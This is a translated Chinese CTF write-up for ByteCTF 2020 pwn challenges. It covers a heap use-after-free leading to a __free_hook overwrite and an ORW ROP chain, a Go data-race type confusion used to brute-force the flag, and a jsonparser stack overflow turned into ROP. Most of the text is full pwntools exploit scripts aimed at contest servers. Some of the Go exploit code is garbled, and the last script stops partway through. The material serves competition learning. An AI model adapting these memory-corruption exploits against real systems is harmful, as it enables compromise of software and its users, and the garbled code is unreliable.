# Bytectf2020 web&pwn writeup by HuaShuiTeam
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## gun
shoot功能存在逻辑问题导致UAF，可以造成load的bullet再次free
利用unsortedbin构造fake chunk，free进tcache后，直接修改fd指向__free_hook即可
程序存在sandbox，只能orw
setcontext为rdx寄存器，考虑转向IO，通过vtable间接设置:
    https://kirin-say.top/2020/06/29/0CTF-TCTF-2020-Quals-PWN/
或者利用可以通过rdi设置rdx寄存器的gadget：
    ropper --file ./libc-2.31.so  --search "mov rdx,"
    ......
    0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    ......
    from pwn import *
    context.log_level="debug"
    def add(size,note):
        p.sendlineafter("> ", "3")
        p.sendlineafter("price: ", str(size))
        p.sendafter(": ", note)
    def magic(index):
        p.sendlineafter("> ", "2")
        p.sendlineafter("?", str(index))
    def delete(index):
        p.sendlineafter("> ", "1")
        p.sendlineafter(": ", str(index))
    #p=process("./gun")
    p=remote("123.57.209.176",30772)
    name="name: \n"
    p.sendafter(": ",name)
    for i in range(8):
       add(0x80,"a\n")
    for i in range(8):
        magic(i)
    delete(10)
    add(0x50,"\n")
    magic(0)
    delete(1)
    p.recvuntil("The ")
    libc=u64(p.recv(6)+"\x00\x00")-0x7ffff7fc2be0+0x7ffff7dd7000-0x80
    print hex(libc)
    for i in range(9):
       add(0x80,"bbbbb\n")
    for i in range(9):
        magic(8-i)
    delete(10)
    add(0x410,p64(0)*16+p64(0)+p64(0x31)+p64(0)*5+p64(0x21)+"\n")
    add(0x20,"aaaa\n")
    for i in range(6):
       add(0x10,"bbbbb\n")
    magic(7)
    magic(1)
    delete(3)
    magic(0)
    delete(1)
    add(0x20,"\n")
    magic(0)
    delete(1)
    p.recvuntil("The ")
    heap=u64(p.recv(6)+"\x00\x00")
    print hex(heap)
    #0x55555555b330
    payload=p64(0)+p64(heap-0x55555555b330+0x55555555b760-0x20)+p64(libc+0x580DD)
    rdi=libc+0x0000000000026b72
    rsi=libc+0x27529
    rdx2=libc+0x162866
    rax=libc+0x4a550
    payload2=p64(heap-0x55555555b330+0x55555555b810)+p64(rsi)+p64(0)+p64(rax)+p64(2)+p64(libc+0x111140)
    payload2+=p64(rdi)+p64(3)+p64(rsi)+p64(heap)+p64(rdx2)+p64(0x30)+p64(0)+p64(libc+0x00111130)
    payload2+=p64(rdi)+p64(1)+p64(rsi)+p64(heap)+p64(rdx2)+p64(0x30)+p64(0)+p64(libc+0x001111d0)
    add(0x1b0,payload.ljust(16*8,"\x00")+p64(0)+p64(0x31)+p64(libc+0x00001eeb28)+p64(0)*4+p64(0x21)+"/flag\x00\x00\x00"+p64(0)+payload2+"\n")
    add(0x20,p64(heap-0x55555555b330+0x55555555b820)+p64(rdi)+"\n")
    add(0x20,p64(libc+0x154930)+"\n")
    magic(0)
    delete(1)
    p.interactive()
## leak
golang ,添加函数，leak源码中的flag
    package main
    func main() {
        flag := []int64{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
        for i, v := range flag {
      flag[i] = v + 1
        }
        hack()
    }
    /* your function will be placed here */
    /* input the whole hack() function as follow */
    /* and end the code with '#' */
    /*
    func hack() {
        TODO
    }
    */
利用golang data race造成类型混淆，而后可以进行任意地址读写
考虑flag会在ELF中存一份，在rodata附近爆破出flag保存地址
而后一字节一字节爆破即可
    from pwn import *
    import sys
    #context.log_level = 'debug'
    p = remote("123.57.209.176",30775)
    flag=""
    key="1234567890abcdef-" #uuid
    flag_index=40#为了稳定，比赛时选择每3字节爆破
    for i in range(3):
      for j in key:
          try:
            tmp= 0x0483000+i*0x8
            p = remote("123.56.96.75",30775)
            magic='''
            func hack() {
                type Mem struct {
                     addr *uintptr 
                     data *uintptr
             }
             m := new(Mem)
             var i, j, k interface{}
             i = (*uintptr)(nil)
             j = &m.data
             var z int=0
             go func(){
                    for {
                        z++
                        k = i
                        func() {
                            if z Crash
                     *m.addr=0
                     *m.data=0
               }
               break
              }
             }
            }
            ''' %(0x483000+72*8+(flag_index+i)*8,ord(j))
            p.sendlineafter("code: \n", magic+"#")
            s=p.recv()
            print s
            if "exit status 2"  in s:
                 flag+=j
                 print flag
                 break
            else:
                 print "no 1"
            p.close()
          except:
            p.close()
            print "no"
    print flag
    #ByteCTF{898ab99c-67d0-4188-81ef-253c12492868}
## ohmyjson
golang写的json解析程序
存在混淆，golanghelper恢复没有效果，不过debug信息会有源码位置，因此选择人为制造Crash，可以定位到一些关键函数，和直接获得对应源码位置，根据源码行数可以确定函数
大致流程:read => strings.Split => ParseJson
Split会按照空格分割并判断是否为3个部分
而后会使用jsonparser.Delete，将json中第二个部分指定的成员删除
在逆向出最后一个的作用前，进行简单测试发现利用:
    # buger/jsonparser 唯一相关CVE(恰好也在jsonparser.Delete)
    https://github.com/buger/jsonparser/issues/188
类似的一些非法json，会导致处理时间过长，导致最后一个达到(第三部分比较长时)栈溢出(猜测是Thread返回设置标志位等原因触发溢出函数)，并且一些情况下(第三部分比较短时)可以输出第三部分信息  
debug时可以看到溢出时栈信息:
    pwndbg> x/100xg $rsp-0xa0
    0xc000045e00:    0x0000555555699c40    0x000000c000102000
    0xc000045e10:    0x000000c000045e40    0x0000555555609ade
    0xc000045e20:    0x0000000000000000    0x0000000000000000
    0xc000045e30:    0x000000c000045de0    0x0000000000000020
    0xc000045e40:    0x0000000000000020    0x000000c00005c180
    0xc000045e50:    0x000000c000045e20    0x0000000000000001
    0xc000045e60:    0x0000000000000000    0x0000000000000000
    0xc000045e70:    0x000000c00005c1e0    0x0000000000000000
    0xc000045e80:    0x0000000000000001    0x0000000000000000
    0xc000045e90:    0x0000000000000000    0x000000c000045f78
    0xc000045ea0:    0x000055555566afd0    0x000000c000000000
    ......
溢出会从第三部分的0x30字节往后，覆盖到0xc000045e10地址之后  
可以看到0xc000045e30位置为一个slice:
    struct slice{
        byte* array;
        uintgo len;
        uintgo cap;
    }
debug+硬件断点确定实际输出的是这个slice的数据
0xc000045ea0位置为返回地址
Exploit: 利用golang栈地址相对固定(远程利用报错debug信息可以看到栈地址)来设置好slice结构进行leak程序加载基址
而后部分覆盖返回地址进行复用(1/16爆破)
复用后直接ROP执行execv即可
    #测试使用"{{{}"这类json也可以
    from pwn import *
    context.log_level="debug"
    #p=process("./chall")
    p=remote("123.57.209.176",30773)
    payload='{{{} a '+"\x00"*0x30
    payload+=(p64(0)*4+p64(0xc00003eea0)+p64(0x50)+p64(0x50)).ljust(0x90,"\x00")